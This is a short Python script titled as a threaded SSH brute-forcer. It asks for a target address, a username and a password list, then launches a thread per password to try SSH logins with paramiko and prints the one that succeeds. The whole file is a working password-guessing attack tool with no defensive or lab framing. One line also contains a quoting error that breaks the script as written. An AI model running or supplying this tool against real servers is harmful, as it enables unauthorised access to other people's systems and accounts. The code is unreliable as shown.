#!/usr/bin/env python

# threaded_ssh_bruteforcer

import paramiko, sys, os, termcolor
import threading, time 

stop_flag = 0

def ssh_connect(password, code=0):
	global stop_flag
	ssh = paramiko.SSHClient()
	ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

	try:
		ssh.connect(host, port=22, username=username, password=password)
		stop_flag = 1
		print(termcolor.colored(('[+] Found Password: ' + password + ', for Username: ' + username), 'green')
	except:
		print(termcolor.colored(('[-] Incorrect Password: ' + password), 'red')
	ssh.close()

host = input('[+] Target Address: ')
username = input('[+] SSH Username: ')
input_file = input('[+] Password File: ')
print('\n')

if os.path.exists(input_file) == False:
	print('File/Path doesn't exist')
	sys.exit(1)
	
with open(input_file, 'r') as file:
	for line in file.readlines():
		if stop_flag == 1:
			t.join()
			exit()
		password = line.strip()
		t = threading.Thread(target=ssh_connect, args=(password,))
		t.start()
		time.sleep(0.5)
